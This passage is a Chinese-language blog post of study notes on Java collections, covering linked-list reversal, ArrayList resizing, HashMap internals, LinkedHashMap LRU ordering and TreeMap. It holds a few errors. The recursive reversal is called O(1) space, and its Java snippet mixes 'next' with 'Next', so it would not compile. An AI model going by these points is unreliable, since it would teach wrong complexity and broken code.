<h3 id="反转链表操作">反转链表操作</h3>
<ol>
<li>
<p>递归，空间复杂度 O(1)</p>
<pre><code class="language-java">public ListNode Reverse(ListNode list) {
    if (list == null) return null; // first question

    if (list.next == null) return list; // second question

    // third question - in Lisp this is easy, but we don't have cons
    // so we grab the second element (which will be the last after we reverse it)

    ListNode secondElem = list.next;

    // bug fix - need to unlink list from the rest or you will get a cycle
    list.next = null;

    // then we reverse everything from the second element on
    ListNode reverseRest = Reverse(secondElem);

    // then we join the two lists
    secondElem.Next = list;

    return reverseRest;
}
</code></pre>
</li>
<li>
<p>双指针</p>
</li>
<li>
<p>当成栈，推入另一个栈，空间复杂度 O(N)</p>
</li>
</ol>
<h3 id="时间复杂度">时间复杂度</h3>
<ul>
<li>随机访问：O(N)</li>
<li>查找：O(N)</li>
<li>插入删除
<ul>
<li>头尾：O(1)</li>
<li>中部：O(N)</li>
</ul>
</li>
</ul>
<h2 id="arraylist">ArrayList</h2>
<figure data-type="image" tabindex="2"><img src="https://yao177.github.io/post-images/1600164973242.png" alt="ArrayList 类图" loading="lazy"></figure>
<h3 id="基本介绍-2">基本介绍</h3>
<ol>
<li>较普通数组来讲，具有动态扩展的能力，因此也可称之为「动态数组」</li>
<li>默认长度为 10，扩容每次是 1.5 倍（<code>oldCapacity + (oldCapacity &gt;&gt; 1)</code>）</li>
<li>删除元素不会缩容，最后一位置 <code>nul</code>便于 GC 回收</li>
<li>并集<code>addAll()</code>，交集<code>retainAll()</code>，单向差集<code>removeAll()</code></li>
</ol>
<h3 id="初始化">初始化</h3>
<ul>
<li>new ArrayList()：从 10 开始，逐步扩容</li>
<li>new ArrayList(0)：从 0 开始，到 1，逐步扩容</li>
</ul>
<h3 id="如何插入元素如何扩容">如何插入元素？如何扩容</h3>
<ol>
<li>检查是否需要扩容</li>
<li><code>elementData</code>为<code>DEFAULTCAPACITY_EMPTY_ELEMENTDATA</code>则初始化容量为<code>DEFAULT_CAPACITY</code>也就是 10</li>
<li>新容量是老容量的1.5倍（<code>oldCapacity + (oldCapacity &gt;&gt; 1)</code>）；如果加了这么多容量发现比需要的容量还小，则以需要的容量为准；如果超过新容量超过最大容量，则使用最大容量</li>
<li>创建新容量的数组并把老数组拷贝到新数组</li>
</ol>
<p>PS：有个注意点，扩容函数传入的是 oldCap + 1，保证了数组大小小于 2 的情况下不会不扩容</p>
<h2 id="hashset">HashSet</h2>
<figure data-type="image" tabindex="3"><img src="https://yao177.github.io/post-images/1600165004129.png" alt="HashSet 类图" loading="lazy"></figure>
<p>一个 HashMap，key 为值、value 为<code>PRESENT</code></p>
<h2 id="linkedhashset">LinkedHashSet</h2>
<p>一个 LinkedHashMap，key 为值、value 为<code>PRESENT</code></p>
<h2 id="treeset">TreeSet</h2>
<p>一个 TreeMap，key 为值、value 为<code>PRESENT</code></p>
<h2 id="hashmap">HashMap</h2>
<figure data-type="image" tabindex="4"><img src="https://yao177.github.io/post-images/1600165019290.png" alt="HashMap 类图" loading="lazy"></figure>
<h3 id="基本介绍-3">基本介绍</h3>
<ol>
<li>key-value 存储结构，数组 + 链表 + 红黑树的结构</li>
<li>查询和修改速度很快，能达到 O(1) 的平均时间复杂度</li>
<li>容量为数组长度，默认 16，最大为 2^30，达到 64 时可以树化；装载因子用来计算容量达到多少时进行扩容，默认装载因子为 0.75</li>
<li>数组容量≥64 &amp; 链表长度≥8 进行树化，链表长度≤6 时反树化</li>
</ol>
<h3 id="节点">节点</h3>
<ul>
<li>
<p>链表节点<code>Node</code></p>
<pre><code class="language-java">static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; {
    final int hash;
    final K key;
    V value;
    Node&lt;K,V&gt; next;
}
</code></pre>
</li>
<li>
<p>红黑树节点<code>TreeNode</code></p>
<pre><code class="language-java">// 位于HashMap中
static final class TreeNode&lt;K,V&gt; extends LinkedHashMap.Entry&lt;K,V&gt; {
    TreeNode&lt;K,V&gt; parent;  // red-black tree links
    TreeNode&lt;K,V&gt; left;
    TreeNode&lt;K,V&gt; right;
    TreeNode&lt;K,V&gt; prev;    // needed to unlink next upon deletion
    boolean red;
}

// 位于LinkedHashMap中，典型的双向链表节点
static class Entry&lt;K,V&gt; extends HashMap.Node&lt;K,V&gt; {
    Entry&lt;K,V&gt; before, after;
    Entry(int hash, K key, V value, Node&lt;K,V&gt; next) {
        super(hash, key, value, next);
    }
}
</code></pre>
</li>
</ul>
<h3 id="hash-过程">Hash 过程</h3>
<p>key 为 null，hash 值为 0</p>
<p>高 16 位与整个 hash 值异或，为了使计算出的 hash 更分散</p>
<p><code>n % k == n &amp; (k - 1)</code></p>
<p>解决 hash 冲突的办法是「拉链法」，而 Java 的 ThreadLocalMap、Python 的 dict 则使用了开放寻址法</p>
<h3 id="插入节点过程">插入节点过程</h3>
<ol>
<li>计算 key 的 hash</li>
<li>桶数量为 0，则初始化桶</li>
<li>三种情况
<ol>
<li>key 所在桶无元素，直接插入</li>
<li>key 所在桶的第一个元素的 key 与待插入的 key 相同，说明找到了元素，转到「5」</li>
<li>第一个元素为树节点，调用<code>putTreeVal()</code></li>
</ol>
</li>
<li>不是这三种情况，则遍历桶对应的链表查找 key 是否存在
<ol>
<li>找到了对应 key 的元素，转到「5」</li>
<li>没找到对应 key 的元素，则在链表最后插入一个新节点并判断是否需要树化</li>
</ol>
</li>
<li>找到了对应 key 的元素，则判断是否需要替换旧值，并直接返回旧值</li>
<li>如果插入了元素，则数量 +1 并判断是否需要扩容</li>
</ol>
<h3 id="尾插法">尾插法</h3>
<p>Java 7 及之前是头插法：后面的值被查找的概率更大一些</p>
<p>尾插法：扩容分链前后链表顺序不变，保持了之前节点的引用关系，防止 1-&gt;2-&gt;1 的死链产生</p>
<p>依旧不是线程安全的，put / get 依旧没有同步锁，会出现 ABA 的问题</p>
<h3 id="扩容机制">扩容机制</h3>
<p>桶为空的话，第一次加入元素时进行初始化</p>
<p>扩容门槛为传入的初始容量往上取最近的 2^n</p>
<p>拷贝原数组</p>
<h2 id="linkedhashmap">LinkedHashMap</h2>
<figure data-type="image" tabindex="5"><img src="https://yao177.github.io/post-images/1600165037900.png" alt="LinkedHashMap 类图" loading="lazy"></figure>
<h3 id="accessorder-是什么">accessOrder 是什么</h3>
<p>先看看在哪里使用了</p>
<pre><code class="language-java">public V get(Object key) {
    Node&lt;K,V&gt; e;
    if ((e = getNode(hash(key), key)) == null)
        return null;
    if (accessOrder)
        afterNodeAccess(e);
    return e.value;
}
</code></pre>
<p>看一下 <code>afterNodeAccess()</code>的代码，可以看到最大的不同就是，调用 get 方法时，都会将访问的 Node 移动到尾部，成为尾节点，也就是控制了访问顺序。</p>
<p>因此，置为 true 后，则使用 LRU 调度算法（最近最少使用）。</p>
<h2 id="treemap">TreeMap</h2>
<figure data-type="image" tabindex="6"><img src="https://yao177.github.io/post-images/1600165054964.png" alt="TreeMap 类图" loading="lazy"></figure>
<h3 id="基本介绍-4">基本介绍</h3>
<ul>
<li>实现了 SortedMap 接口，因此是经过排序的</li>
<li>只使用到了红黑树，所以时间复杂度为 O(log N)</li>
</ul>
<h3 id="排序问题">排序问题</h3>
<p>红黑树根据 key 进行排序，有两种方式</p>
<ol>
<li>key 实现 Comparable 接口</li>
<li>构造时传入比较器</li>
</ol>
]]></content>
    </entry>
</feed>